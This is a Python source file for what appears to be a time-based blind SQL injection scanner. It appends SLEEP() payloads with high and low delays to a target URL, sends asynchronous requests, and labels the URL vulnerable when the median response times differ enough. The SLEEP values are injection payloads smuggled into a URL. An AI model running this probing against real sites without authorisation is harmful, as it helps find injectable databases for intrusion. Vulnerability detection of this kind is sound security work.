import numpy as np
import asyncio
import timeit
from aiohttp import ClientSession
from aiohttp import TCPConnector


async def get_url_rtt(url, session, i):
    '''
    Makes http request to the "url" and returns the RTT along with the url and an id "i"
    '''

    get_url_rtt.start_time[url+str(i)] = timeit.default_timer()  # Concatenating "url" and "i" in order to make sure the key is unique

    async with session.get(url) as response:
        _ = await response.read()
        rtt = timeit.default_timer() - get_url_rtt.start_time[url+str(i)]

        return (i, rtt, url)


def analyze_rtts(rtts, diff):
    '''
    Analyses two sets of rtts and decides whether the difference shows a vulnerability (label 1) or not (label 0)
    '''

    low_delay = []
    high_delay = []

    for rtt in rtts:
        if rtt[0] % 2 == 0:
            high_delay.append(rtt[1])
        else:
            low_delay.append(rtt[1])
    
    difference = np.median(high_delay) - np.median(low_delay)

    # If the the high and low rtts differ by more than 
    return int(difference >= diff)


async def scan_url(url, high, low, num_requests, sem = None):
    '''
    Scans the "url" for "num_requests" times.
    Half of those requests have a sleep command with a "high" sleep delay
    The other half have a sleep command with a "low" sleep delay
    '''

    tasks = []
    con = TCPConnector(ssl=False)  # In case of SSL type errors
    get_url_rtt.start_time = {}
    
    if sem != None: await sem.acquire()  # In case semaphores are used to call this function

    # Fetch all responses within one Client session, keep connection alive for all requests.
    async with ClientSession(connector=con) as session:
        for i in range(1, num_requests + 1):

            if i % 2 == 0:  # Even Number gets assigned High Delay
                task = asyncio.ensure_future(get_url_rtt(url + 'SLEEP({})'.format(high), session, i))
                tasks.append(task)

            else:  # Odd Number gets assigned Low Delay
                task = asyncio.ensure_future(get_url_rtt(url + 'SLEEP({})'.format(low), session, i))
                tasks.append(task)

        # All RTTs from responses are in this variable
        responses = await asyncio.gather(*tasks)

    if sem != None: sem.release() 

    return responses


def test(url, high = 0.8, low= 0.03, num_requests = 24, diff = 3):
    '''
    Returns whether a url is vulnerable (label 1) or safe (label 0)
    '''

    # Scan URL in async
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(scan_url(url, high, low, num_requests))
    loop.run_until_complete(future)

    return analyze_rtts(future.result(), diff)
